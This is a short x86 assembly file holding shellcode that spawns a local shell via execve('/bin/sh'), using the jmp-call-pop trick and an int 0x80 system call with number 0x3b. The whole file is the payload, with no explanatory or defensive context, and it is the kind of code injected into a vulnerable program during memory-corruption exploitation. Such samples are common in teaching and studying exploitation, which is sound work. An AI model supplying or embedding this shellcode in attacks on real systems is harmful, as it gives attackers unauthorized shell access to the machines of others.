section .text
global start

start:
	jmp short binsh

; execve("/bin/sh", 0, 0)
shellcode:
	pop ebx
	xor eax,eax
	push eax
	push eax
	push ebx
	mov al, 0x3b
	push eax
	int 0x80
	ret

binsh:
	call shellcode
	db '/bin/sh'

